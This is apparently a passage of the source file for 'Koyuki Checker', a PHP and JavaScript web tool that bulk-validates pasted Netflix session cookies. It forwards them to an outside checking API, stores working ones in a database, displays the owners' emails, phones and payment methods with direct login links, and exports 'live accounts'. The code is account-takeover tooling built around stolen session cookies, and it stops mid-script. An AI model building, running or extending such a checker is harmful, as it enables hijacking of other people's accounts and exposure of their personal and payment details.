<?php
// Include the database connection
require_once 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw_post_data = file_get_contents('php://input');
    $json_data = json_decode($raw_post_data, true);

    if (isset($json_data['cookie'])) {
        
        // Suppress PHP warnings from corrupting the JSON output
        error_reporting(0);
        
        // --- ZNFCHECKER API INTEGRATION ---
        $api_url = "https://zxndev.xyz/api/v1/check";
        // Fetches securely from Heroku environment variables
        $api_key = getenv('ZNF_API_KEY'); 

        // Force UTF-8 encoding to prevent json_encode from failing
        $safe_cookie = mb_convert_encoding($json_data['cookie'], 'UTF-8', 'UTF-8');

        $payload = json_encode([
            'cookie_data' => $safe_cookie
        ], JSON_UNESCAPED_SLASHES);

        $ch = curl_init($api_url);
        $responseHeaders = [];

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        
        // Added standard Chrome User-Agent to prevent Cloudflare/WAF blocking datacenter IPs
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Accept: application/json',
            'X-API-Key: ' . $api_key,
            'Expect:' 
        ]);

        curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($ch, $header) use (&$responseHeaders) {
            $length = strlen($header);
            if (strpos($header, ':') !== false) {
                list($key, $value) = explode(':', $header, 2);
                $responseHeaders[strtolower(trim($key))] = trim($value);
            }
            return $length;
        });

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);

        $response = curl_exec($ch);
        $curl_error = curl_error($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // Check if response is valid JSON
        $is_valid_json = false;
        $parsed = null;
        if ($response) {
            $parsed = json_decode($response, true);
            if (json_last_error() === JSON_ERROR_NONE) {
                $is_valid_json = true;
            }
        }

        // --- DATABASE SAVING LOGIC ---
        if ($http_code === 200 && $is_valid_json) {
            if (is_array($parsed)) {
                $verdictStr = strtolower($parsed['verdict'] ?? '');
                $signalStr = strtolower($parsed['matchedSignal'] ?? '');
                
                $is_success = in_array($verdictStr, ['accepted', 'working', 'live', 'valid', 'success']) || 
                              strpos($signalStr, 'active auth path') !== false || 
                              strpos($signalStr, 'membership found') !== false ||
                              strpos($signalStr, 'confirmed') !== false;

                if ($is_success && isset($pdo)) {
                    try {
                        $stmt = $pdo->prepare("SELECT id FROM active_accounts WHERE cookie_data = ?");
                        $stmt->execute([$safe_cookie]);
                        
                        if ($stmt->rowCount() == 0) {
                            $insert = $pdo->prepare("INSERT INTO active_accounts (cookie_data) VALUES (?)");
                            $insert->execute([$safe_cookie]);
                        }
                    } catch (\PDOException $e) {
                        error_log("DB Save Error: " . $e->getMessage());
                    }
                }
            }
        }

        if ($http_code === 429 && isset($responseHeaders['retry-after'])) {
            header('Retry-After: ' . $responseHeaders['retry-after']);
        }

        if ($response === false) {
            $http_code = 500;
            $response = json_encode(['verdict' => 'FAILED', 'error' => 'cURL connection failed: ' . $curl_error]);
        } elseif (!$is_valid_json) {
            // API returned HTML (Cloudflare IP Block or Invalid Key)
            $http_code = 200; // Force 200 so frontend parses our custom error safely
            $clean_html = trim(preg_replace('/\s+/', ' ', strip_tags($response)));
            $response = json_encode(['verdict' => 'BLOCKED', 'error' => 'API Blocked Heroku IP: ' . substr($clean_html, 0, 150)]);
        }

        http_response_code($http_code);
        header('Content-Type: application/json');
        echo $response ?: json_encode(['error' => 'Empty response from API']);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Koyuki | Premium ZNFChecker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <!-- Premium Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Faculty+Glyphic&family=Rye&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            /* Cold as Ice Palette */
            --primary: #00e5ff;       /* Ice Cyan */
            --secondary: #0055ff;     /* Deep Freeze Blue */
            --accent: #ccf0ff;        /* Frost White */
            --bg-dark: #020813;       /* Midnight Ice */
            --card-bg: rgba(4, 12, 24, 0.65);
            --card-border: rgba(0, 229, 255, 0.25);
            --text-main: #f0f8ff;
            --text-muted: #7fa4c9;
        }

        body { 
            background: radial-gradient(ellipse at 50% 0%, #003366 0%, var(--bg-dark) 70%);
            color: var(--text-main); 
            font-family: 'Faculty Glyphic', sans-serif; 
            padding-top: 80px; 
            min-height: 100vh;
            background-attachment: fixed;
            display: flex;
            flex-direction: column;
        }
        
        .rye-font { font-family: 'Rye', serif; font-weight: normal; }

        .premium-card { 
            background: var(--card-bg); 
            border: 1px solid var(--card-border); 
            border-radius: 24px; 
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
        }

        .glow-text {
            background: linear-gradient(to right, #00e5ff, #8ab4f8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(0, 229, 255, 0.4);
        }

        textarea.form-control { 
            background: rgba(2, 8, 20, 0.6); 
            border: 1px solid rgba(0, 229, 255, 0.2); 
            color: #e2e8f0; 
            border-radius: 16px; 
            font-size: 14px;
            font-family: monospace;
            transition: all 0.3s ease;
        }
        textarea.form-control:focus { 
            background: rgba(2, 8, 20, 0.9); 
            border-color: var(--primary); 
            color: #fff; 
            box-shadow: 0 0 20px rgba(0, 229, 255, 0.2); 
            outline: none; 
        }

        .btn-premium { 
            background: linear-gradient(135deg, var(--secondary), var(--primary)); 
            border: none; 
            border-radius: 16px; 
            font-weight: 700; 
            color: white;
            box-shadow: 0 10px 25px -5px rgba(0, 229, 255, 0.3);
            transition: all 0.3s ease;
            text-transform: uppercase;
            font-family: 'Faculty Glyphic', sans-serif;
        }
        .btn-premium:hover { 
            transform: translateY(-2px);
            box-shadow: 0 15px 30px -5px rgba(0, 229, 255, 0.5);
            color: white;
        }
        .btn-premium:disabled { opacity: 0.7; transform: none; cursor: not-allowed; }

        .mode-switcher {
            background: rgba(4, 12, 24, 0.8);
            border: 1px solid var(--card-border);
            border-radius: 12px;
            padding: 6px;
            display: inline-flex;
            margin-bottom: 24px;
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
        }
        .mode-btn {
            background: transparent;
            color: var(--text-muted);
            border: none;
            padding: 10px 28px;
            font-weight: 600;
            font-size: 14px;
            border-radius: 8px;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            cursor: pointer;
            font-family: 'Faculty Glyphic', sans-serif;
        }
        .mode-btn:hover:not(.active) { color: var(--text-main); }
        .mode-btn.active {
            background: linear-gradient(135deg, var(--secondary), var(--primary));
            color: white;
            box-shadow: 0 4px 12px rgba(0, 229, 255, 0.3);
        }

        .carousel-wrapper { display: flex; align-items: center; justify-content: center; gap: 15px; position: relative; width: 100%; }
        .carousel-viewport { flex-grow: 1; overflow: hidden; position: relative; width: 100%; }
        .carousel-card { display: none; width: 100%; animation: slideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        .carousel-card.active { display: block; }
        .nav-btn-icon {
            background: rgba(4, 12, 24, 0.8);
            border: 1px solid var(--card-border);
            color: var(--primary);
            width: 44px;
            height: 44px;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            transition: all 0.2s; cursor: pointer; flex-shrink: 0;
        }
        .nav-btn-icon:hover:not(:disabled) { background: var(--primary); color: white; box-shadow: 0 0 15px rgba(0, 229, 255, 0.4); }
        .nav-btn-icon:disabled { opacity: 0.3; cursor: not-allowed; border-color: var(--text-muted); color: var(--text-muted); }
        .carousel-indicator { text-align: center; color: var(--text-muted); font-size: 13px; font-weight: 600; margin-top: 15px; letter-spacing: 1px; }

        .result-item { 
            background: rgba(2, 6, 23, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.05); 
            border-radius: 16px; padding: 16px; margin-bottom: 20px; transition: transform 0.2s;
        }
        @media (min-width: 640px) { .result-item { padding: 24px; } }
        .result-item:hover { border-color: rgba(0, 229, 255, 0.3); background: rgba(4, 12, 24, 0.8); }
        .result-item:last-child { margin-bottom: 0; }

        .status-badge { font-size: 10px; padding: 6px 14px; border-radius: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
        .status-success { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }
        .status-error { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
        .status-warning { background: rgba(245, 158, 11, 0.15); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.3); }

        .action-btn {
            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.1); color: var(--text-muted);
            border-radius: 10px; transition: all 0.2s; font-size: 13px; font-weight: 600;
        }
        .action-btn:hover { background: var(--primary); border-color: var(--primary); color: white; text-decoration: none; box-shadow: 0 0 10px rgba(0, 229, 255, 0.3); }

        .detail-label { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-bottom: 4px;}
        .detail-value { font-size: 14px; font-weight: 500; color: var(--text-main); }

        .fade-in { animation: fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
        nav a, nav a:hover { text-decoration: none !important; }
    </style>
</head>
<body>

<nav class="fixed top-0 left-0 w-full z-50 bg-[#020613]/80 backdrop-blur-md border-b border-[rgba(0,229,255,0.2)] shadow-[0_4px_30px_rgba(0,0,0,0.5)]">
    <div class="max-w-[1200px] mx-auto px-4 sm:px-6 lg:px-8">
        <div class="flex items-center justify-between h-20">
            <div class="flex items-center gap-2 sm:gap-3">
                <img src="logo.png" alt="Koyuki Logo" class="h-8 w-8 sm:h-10 sm:w-10 object-cover rounded-lg border border-[#00e5ff]/40 shadow-[0_0_15px_rgba(0,229,255,0.4)]" onerror="this.onerror=null; this.src='https://via.placeholder.com/40/00e5ff/ffffff?text=K';">
                <span class="rye-font text-xl sm:text-2xl tracking-wide glow-text mt-1">Koyuki Checker</span>
            </div>
            <div class="hidden sm:flex items-center gap-6">
                <a href="generator.php" class="bg-[rgba(0,229,255,0.1)] border border-[rgba(0,229,255,0.3)] text-[#00e5ff] hover:bg-[#00e5ff] hover:text-[#020813] px-4 py-2 rounded-xl text-sm font-bold transition-all shadow-[0_0_10px_rgba(0,229,255,0.1)] hover:shadow-[0_0_15px_rgba(0,229,255,0.4)] uppercase tracking-wider flex items-center">Want some Netflix?</a>
                <a href="contact.php" class="text-sm font-bold text-slate-300 hover:text-[#00e5ff] transition-colors uppercase tracking-wider">Contact</a>
            </div>
            <div class="sm:hidden flex items-center">
                <button id="mobileMenuBtn" class="text-[#00e5ff] hover:text-white focus:outline-none text-2xl transition-colors p-2"><i class="fas fa-bars"></i></button>
            </div>
        </div>
    </div>
    <div id="mobileMenu" class="hidden sm:hidden bg-[#020813] border-t border-[rgba(0,229,255,0.1)] py-4 px-6 shadow-[0_10px_30px_rgba(0,0,0,0.8)]">
        <div class="flex flex-col gap-4">
            <a href="generator.php" class="bg-[rgba(0,229,255,0.1)] border border-[rgba(0,229,255,0.3)] text-[#00e5ff] hover:bg-[#00e5ff] hover:text-[#020813] px-4 py-3 rounded-xl text-sm font-bold transition-all shadow-[0_0_10px_rgba(0,229,255,0.1)] uppercase tracking-wider flex items-center justify-center">Want some Netflix?</a>
            <a href="contact.php" class="text-sm font-bold text-slate-300 hover:text-[#00e5ff] transition-colors uppercase tracking-wider flex items-center justify-center pt-2">Contact</a>
        </div>
    </div>
</nav>

<div class="container-fluid pb-5 mt-16 sm:mt-24 mb-20 px-3 sm:px-4 flex-grow min-h-[65vh]" style="max-width: 1200px;">
    <div class="row justify-content-center">
        <div class="col-12 col-md-11 col-lg-10">
            <div class="premium-card p-4 sm:p-5 mb-5 relative overflow-hidden">
                <div class="absolute top-0 right-0 w-64 h-64 bg-cyan-400/10 rounded-full blur-3xl -mr-20 -mt-20 pointer-events-none"></div>
                <div class="absolute bottom-0 left-0 w-48 h-48 bg-blue-600/10 rounded-full blur-3xl -ml-20 -mb-20 pointer-events-none"></div>
                <div class="relative z-10">
                    <div id="sectBulk" class="fade-in">
                        <div class="d-flex justify-content-between align-items-end mb-3 gap-2">
                            <label class="rye-font text-lg sm:text-xl text-slate-200 m-0 glow-text">Input Payload</label>
                            <span class="text-[10px] sm:text-xs text-[#00e5ff] bg-slate-800/50 px-2 sm:px-3 py-1 rounded-full border border-[rgba(0,229,255,0.2)] whitespace-nowrap">Auto-Detect Format</span>
                        </div>
                        <textarea id="bulkInput" class="form-control mb-4 p-3 sm:p-5" rows="7" placeholder="Paste a single cookie, JSON arrays, Netscape format, or raw strings here..."></textarea>
                        <button id="startBulkBtn" class="btn btn-premium w-full max-w-full py-3 sm:py-4 text-sm sm:text-lg lg:text-xl tracking-wider sm:tracking-[2px] flex items-center justify-center mx-auto" style="white-space: normal; word-wrap: break-word;" onclick="processBulk()">
                            <i class="fas fa-layer-group mr-2 flex-shrink-0"></i> <span>INITIATE VALIDATION</span>
                        </button>
                    </div>
                </div>
            </div>

            <div class="premium-card p-4 sm:p-5" id="resultsCard" style="display: none;">
                <div class="d-flex justify-content-between align-items-center mb-4 border-b border-[rgba(0,229,255,0.15)] pb-4">
                    <h5 class="rye-font text-xl sm:text-2xl m-0 text-slate-200 glow-text">Execution Results</h5>
                    <div class="bg-[#040c18] px-3 sm:px-4 py-2 rounded-xl border border-[rgba(0,229,255,0.2)] shadow-[inset_0_0_10px_rgba(0,0,0,0.5)]">
                        <span id="progressText" class="text-[#00e5ff] font-semibold text-xs sm:text-sm"><i class="fas fa-spinner fa-spin mr-2"></i> Awaiting Data</span>
                    </div>
                </div>

                <div id="bulkStats" class="flex-wrap justify-content-around mb-4 pb-4 border-b border-[rgba(0,229,255,0.15)] gap-y-4" style="display: none;">
                    <div class="text-center w-1/3 sm:w-auto">
                        <div class="text-2xl sm:text-3xl font-bold text-emerald-400 drop-shadow-[0_0_8px_rgba(52,211,153,0.5)]" id="statActive">0</div>
                        <div class="text-[10px] sm:text-xs uppercase tracking-wider text-slate-400 mt-1">Live Accounts</div>
                    </div>
                    <div class="text-center border-x border-[rgba(0,229,255,0.15)] px-2 sm:px-5 w-1/3 sm:w-auto">
                        <div class="text-2xl sm:text-3xl font-bold text-red-400 drop-shadow-[0_0_8px_rgba(248,113,113,0.5)]" id="statDead">0</div>
                        <div class="text-[10px] sm:text-xs uppercase tracking-wider text-slate-400 mt-1">Dead / Errors</div>
                    </div>
                    <div class="text-center w-1/3 sm:w-auto">
                        <div class="text-2xl sm:text-3xl font-bold text-amber-400 drop-shadow-[0_0_8px_rgba(251,191,36,0.5)]" id="statLimit">0</div>
                        <div class="text-[10px] sm:text-xs uppercase tracking-wider text-slate-400 mt-1">Rate Limited</div>
                    </div>
                </div>

                <div id="carouselWrapper" class="carousel-wrapper" style="display: none;">
                    <button id="btnPrev" class="nav-btn-icon" onclick="navCarousel(-1)"><i class="fas fa-chevron-left"></i></button>
                    <div class="carousel-viewport"><div id="bulkResultsList"></div></div>
                    <button id="btnNext" class="nav-btn-icon" onclick="navCarousel(1)"><i class="fas fa-chevron-right"></i></button>
                </div>
                
                <div id="carouselIndicator" class="carousel-indicator" style="display: none;">0 / 0</div>

                <div id="downloadWrapper" class="mt-5" style="display: none;">
                    <button onclick="downloadLiveAccounts()" class="btn btn-premium w-100 py-3 text-sm sm:text-lg tracking-wider" style="background: linear-gradient(135deg, #059669, #10b981); box-shadow: 0 10px 25px -5px rgba(16, 185, 129, 0.4);">
                        <i class="fas fa-download mr-2"></i> DOWNLOAD LIVE ACCOUNTS
                    </button>
                </div>
            </div>
        </div>
    </div>
</div>

<footer class="w-full border-t border-[rgba(0,229,255,0.15)] bg-[#020613]/80 backdrop-blur-md mt-auto py-6 text-center z-10 relative">
    <div class="max-w-[1200px] mx-auto px-4">
        <p class="text-[#7fa4c9] text-xs sm:text-sm font-medium tracking-wider">
            &copy; 2026 Koyuki NF Checker. All rights reserved &nbsp;<span class="text-[rgba(0,229,255,0.5)] hidden sm:inline">|</span><br class="sm:hidden"> 
            <span class="mt-2 sm:mt-0 inline-block">Powered by <span class="text-white font-bold">ZXNDEV</span></span>
        </p>
    </div>
</footer>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    let bulkLiveAccounts = [];

    function downloadLiveAccounts() {
        if (bulkLiveAccounts.length === 0) return;
        let currentDate = new Date().toLocaleString();
        let header = `------- Koyuki NF Checker-------\nDate: ${currentDate}\n\n`;
        let content = header + bulkLiveAccounts.join("\n\n=====================\n\n");
        let blob = new Blob([content], { type: "text/plain;charset=utf-8" });
        let link = document.createElement("a"); link.href = URL.createObjectURL(blob);
        link.download = `Koyuki_Live_Accounts_${new Date().toISOString().slice(0,10)}.txt`;
        document.body.appendChild(link); link.click(); document.body.removeChild(link);
    }

    function copyCardDetails(encodedStr) {
        try {
            const decodedStr = decodeURIComponent(escape(atob(encodedStr)));
            const tempTextArea = document.createElement("textarea");
            tempTextArea.value = decodedStr;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand("copy");
            document.body.removeChild(tempTextArea);
            Swal.fire({ toast: true, position: 'top-end', icon: 'success', iconColor: '#00e5ff', title: '> DATA_COPIED', showConfirmButton: false, timer: 2000, background: '#020613', color: '#00e5ff', customClass: { popup: 'border border-[rgba(0,229,255,0.3)] font-mono text-sm sm:text-base' } });
        } catch (err) {
            Swal.fire({ title: 'ERR', text: 'Buffer copy failed.', icon: 'error', background: '#020613', color: '#f87171', confirmButtonColor: '#f87171' });
        }
    }

    let currentActiveIndex = 0; 
    let totalCards = 0;

    function navCarousel(direction) {
        const cards = $('#bulkResultsList .carousel-card');
        if (cards.length === 0) return;
        $(cards[currentActiveIndex]).removeClass('active');
        currentActiveIndex += direction;
        if (currentActiveIndex < 0) currentActiveIndex = 0;
        if (currentActiveIndex >= totalCards) currentActiveIndex = totalCards - 1;
        $(cards[currentActiveIndex]).addClass('active');
        updateCarouselUI();
    }

    function updateCarouselUI() {
        if (totalCards === 0) { $('#carouselWrapper, #carouselIndicator').hide(); return; }
        $('#carouselWrapper, #carouselIndicator').show();
        $('#carouselIndicator').html(`NODE ${currentActiveIndex + 1} / ${totalCards}`);
        $('#btnPrev').prop('disabled', currentActiveIndex === 0);
        $('#btnNext').prop('disabled', currentActiveIndex >= totalCards - 1);
    }

    function parseMixedInput(text) {
        let extracted = []; let startIndex = 0;
        while ((startIndex = text.indexOf('[', startIndex)) !== -1) {
            let endIndex = startIndex; let foundValid = false;
            while ((endIndex = text.indexOf(']', endIndex + 1)) !== -1) {
                let potentialJson = text.substring(startIndex, endIndex + 1);
                try {
                    let parsed = JSON.parse(potentialJson);
                    if (Array.isArray(parsed)) { extracted.push(potentialJson.trim()); text = text.substring(0, startIndex) + " ".repeat(potentialJson.length) + text.substring(endIndex + 1); foundValid = true; break; }
                } catch (e) {}
            }
            if (!foundValid) startIndex++; 
        }
        text = text.replace(/\|/g, '\n'); let lines = text.split(/\r?\n/); let currentNetscape = []; let seenKeys = new Set(); 
        lines.forEach(line => {
            let trimmed = line.trim();
            if (!trimmed || trimmed === ';') {
                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); } return;
            }
            if (trimmed.endsWith(';')) trimmed = trimmed.slice(0, -1).trim();
            if (trimmed.includes('.netflix.com') && (trimmed.includes('TRUE') || trimmed.includes('FALSE'))) {
                let parts = trimmed.split(/\s+/);
                if (parts.length >= 6) { let keyName = parts[5]; if (seenKeys.has(keyName)) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); } seenKeys.add(keyName); }
                currentNetscape.push(trimmed);
            } else if (trimmed.includes('NetflixId=') || trimmed.includes('SecureNetflixId=')) {
                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); } extracted.push(trimmed);
            }
        });
        if (currentNetscape.length > 0) extracted.push(currentNetscape.join('\n'));
        return extracted;
    }

    const sleep = ms => new Promise(r => setTimeout(r, ms));
    const apiUrl = window.location.href; 

    function createResultElement(data, httpStatus, indexNum, originalCookie) {
        let resultHtml = '';
        const verdictStr = (data.verdict || '').toLowerCase();
        const signalStr = (data.matchedSignal || '').toLowerCase();
        const isSuccess = ['accepted', 'working', 'live', 'valid', 'success'].includes(verdictStr) || signalStr.includes('active auth path') || signalStr.includes('membership found') || signalStr.includes('confirmed');

        if (isSuccess) {
            const details = data.accountDetails || {}; const links = data.watchLinks || {};
            let planStr = details.plan || 'N/A'; let isPremium = planStr.toLowerCase().includes('premium'); let planColor = isPremium ? '#34d399' : '#00e5ff';
            let rawProfiles = details.profiles || data.profiles || 'N/A'; let profilesHtml = '';
            if (rawProfiles === 'N/A') { profilesHtml = `<span class="text-slate-500 text-sm">N/A</span>`; } else {
                let profArray = Array.isArray(rawProfiles) ? rawProfiles : String(rawProfiles).split(',');
                profilesHtml = profArray.map(p => `<span class="inline-block bg-[rgba(0,229,255,0.1)] text-[#00e5ff] px-3 py-1.5 rounded-full text-[10px] sm:text-xs font-semibold border border-[rgba(0,229,255,0.3)] mr-2 mb-2 shadow-[0_0_8px_rgba(0,229,255,0.15)]"><i class="fas fa-user-circle mr-1.5 opacity-80"></i>${p.trim()}</span>`).join('');
            }
            let directLink = links.pc || '#'; let mobileLink = links.mobile || '#'; let tvLink = links.tv || '#'; let displayedEmail = details.email || 'Valid Account / Hidden Email';
            let copyText = `Email: ${displayedEmail}\nPhone: ${details.phone || 'N/A'}\nProfiles: ${rawProfiles}\nSubscription Plan: ${planStr}\nCountry: ${details.country || 'N/A'}\nPayment Method: ${details.paymentMethod || 'N/A'}\n\nDirect Watch:\n${directLink}\n\nMobile Watch:\n${mobileLink}\n\nTV Watch:\n${tvLink}\n\nOriginal Data:\n${originalCookie}`;
            let base64CopyData = btoa(unescape(encodeURIComponent(copyText)));

            resultHtml = `
            <div class="result-item">
                <div class="d-flex flex-col sm:flex-row justify-content-between align-items-start mb-3 border-b border-[rgba(0,229,255,0.15)] sm:border-none pb-3 sm:pb-0 gap-2 sm:gap-0">
                    <div><span class="status-badge status-success mr-2"><i class="fas fa-check-circle mr-1"></i> LIVE</span><span class="status-badge bg-slate-800 text-slate-300 border border-slate-700"><i class="fas fa-fingerprint mr-1"></i> NODE_${indexNum}</span></div>
                    <h5 class="text-white font-bold m-0 break-all sm:break-normal text-lg sm:text-xl" style="text-shadow: 0 0 10px rgba(255,255,255,0.2);">${displayedEmail}</h5>
                </div>
                <div class="row g-3 mb-4">
                    <div class="col-sm-4 col-6"><div class="detail-label">Subscription Plan</div><div class="detail-value" style="color: ${planColor}; font-weight: 700;">${planStr} <i class="${isPremium ? 'fas fa-crown ml-1' : ''}"></i></div></div>
                    <div class="col-sm-4 col-6"><div class="detail-label">Country</div><div class="detail-value">${details.country || 'N/A'}</div></div>
                    <div class="col-sm-4 col-6"><div class="detail-label">Payment Method</div><div class="detail-value">${details.paymentMethod || 'N/A'}</div></div>
                    <div class="col-sm-4 col-6"><div class="detail-label">Phone Linked</div><div class="detail-value">${details.phone || 'N/A'}</div></div>
                    <div class="col-sm-8 col-12"><div class="detail-label">API Signal</div><div class="detail-value text-[#00e5ff] truncate" title="${data.matchedSignal || 'Active member'}">${data.matchedSignal || 'Active member'}</div></div>
                    <div class="col-12 mt-2 pt-3 border-t border-[rgba(0,229,255,0.15)]"><div class="detail-label mb-2">Active Profiles</div><div class="mt-1 flex flex-wrap">${profilesHtml}</div></div>
                </div>
                <div class="flex flex-col sm:flex-row gap-2 mb-2">
                    <a href="${directLink}" target="_blank" class="btn action-btn flex-fill py-3 sm:py-2 text-center"><i class="fas fa-desktop mr-2 text-[#00e5ff]"></i> Open in PC</a>
                    <a href="${mobileLink}" target="_blank" class="btn action-btn flex-fill py-3 sm:py-2 text-center"><i class="fas fa-mobile-alt mr-2 text-emerald-400"></i> Mobile</a>
                    <a href="${tvLink}" target="_blank" class="btn action-btn flex-fill py-3 sm:py-2 text-center"><i class="fas fa-tv mr-2 text-amber-400"></i> TV Login</a>
                </div>
                <button onclick="copyCardDetails('${base64CopyData}')" class="btn action-btn w-100 py-3 sm:py-2 border-[rgba(0,229,255,0.3)] hover:border-[#00e5ff] text-[#00e5ff]"><i class="fas fa-copy mr-2"></i> Copy Details</button>
            </div>`;
        } else if (httpStatus === 429) {
            resultHtml = `<div class="result-item d-flex align-items-center"><span class="status-badge status-warning mr-3"><i class="fas fa-exclamation-triangle mr-1"></i> RATE LIMITED</span><div class="ml-2"><div class="text-white font-semibold">${data.error || 'Please slow down.'}</div><div class="text-muted small">Code: ${data.code || 'unknown'}</div></div></div>`;
        } else {
            let failReason = data.matchedSignal || data.accountStatus || data.error || 'Invalid Cookie Session'; let verdictText = data.verdict || 'FAILED';
            resultHtml = `<div class="result-item d-flex align-items-center"><span class="status-badge status-error mr-3"><i class="fas fa-times-circle mr-1"></i> ${verdictText}</span><div class="ml-2"><div class="text-slate-300 font-medium break-all sm:break-normal">${failReason}</div><div class="text-slate-500 small">Node_${indexNum} execution rejected</div></div></div>`;
        }
        return resultHtml;
    }

    async function processBulk() {
        const rawText = $('#bulkInput').val().trim();
        if (!rawText) {
            Swal.fire({ title: 'No Input Detected', text: 'Please paste an input payload first!', icon: 'warning', background: '#020613', color: '#f0f8ff', confirmButtonColor: '#00e5ff', customClass: { popup: 'border border-[rgba(0,229,255,0.3)] rounded-2xl' } }); return;
        }

        const cookies = parseMixedInput(rawText);
        const cookiesToProcess = cookies.length > 0 ? cookies : [rawText];

        $('#startBulkBtn').prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-2"></i> PROCESSING...');
        $('#resultsCard').show(); $('#bulkResultsList').empty(); $('#downloadWrapper').hide(); bulkLiveAccounts = [];
        $('#bulkStats').css('display', 'flex').addClass('fade-in');
        
        let liveCount = 0; let deadCount = 0; let limitCount = 0;
        $('#statActive').text(liveCount); $('#statDead').text(deadCount); $('#statLimit').text(limitCount);
        currentActiveIndex = 0; totalCards = 0; updateCarouselUI();

        for (let i = 0; i < cookiesToProcess.length; i++) {
            $('#progressText').html(`<i class="fas fa-circle-notch fa-spin mr-2"></i>Processing ${i + 1} of ${cookiesToProcess.length}`);
            let dynamicWait = 2000; 
            
            try {
                const response = await fetch(apiUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookie: cookiesToProcess[i] }) });
                const retryAfter = response.headers.get('Retry-After');
                if (retryAfter) { dynamicWait = (parseInt(retryAfter, 10) * 1000) + 1000; }

                const rawResponseText = await response.text();
                let data;
                
                // NEW ERROR CATCHING LOGIC
                try {
                    data = JSON.parse(rawResponseText);
                } catch (e) {
                    // Strips the HTML tags from the response so we can read the raw error directly on screen
                    let cleanResponse = rawResponseText.replace(/(<([^>]+)>)/gi, "").substring(0, 100);
                    throw new Error(`API returned HTML instead of JSON. Server says: "${cleanResponse}..."`);
                }
                
                const verdictStr = (data.verdict || '').toLowerCase(); const signalStr = (data.matchedSignal || '').toLowerCase();
                const isSuccess = ['accepted', 'working', 'live', 'valid', 'success'].includes(verdictStr) || signalStr.includes('active auth path') || signalStr.includes('membership found') || signalStr.includes('confirmed');

                if (isSuccess) {
                    liveCount++; $('#statActive').text(liveCount);
                    const details = data.accountDetails || {}; const links = data.watchLinks || {};
                    let planStr = details.plan || 'N/A'; let rawProfiles = details.profiles || data.profiles || 'N/A'; let displayedEmail = details.email || 'Valid Account / Hidden Email';
                    let accText = `Email: ${displayedEmail}\nPhone: ${details.phone || 'N/A'}\nProfiles: ${rawProfiles}\nSubscription Plan: ${planStr}\nCountry: ${details.country || 'N/A'}\nPayment Method: ${details.paymentMethod || 'N/A'}\n\nDirect Watch:\n${links.pc || '#'}\n\nMobile Watch:\n${links.mobile || '#'}\n\nTV Watch:\n${links.tv || '#'}\n\nOriginal Data:\n${cookiesToProcess[i]}`;
                    bulkLiveAccounts.push(accText);
                } else if (response.status === 429) {
                    limitCount++; $('#statLimit').text(limitCount);
                } else {
                    deadCount++; $('#statDead').text(deadCount);
                }
                
                totalCards++; let isActiveClass = (totalCards === 1) ? 'active' : '';
                const htmlContent = createResultElement(data, response.status, totalCards, cookiesToProcess[i]);
                $('#bulkResultsList').append(`<div class="carousel-card ${isActiveClass}">${htmlContent}</div>`);
                updateCarouselUI();

            } catch (error) {
                totalCards++; deadCount++; $('#statDead').text(deadCount);
                let isActiveClass = (totalCards === 1) ? 'active' : '';
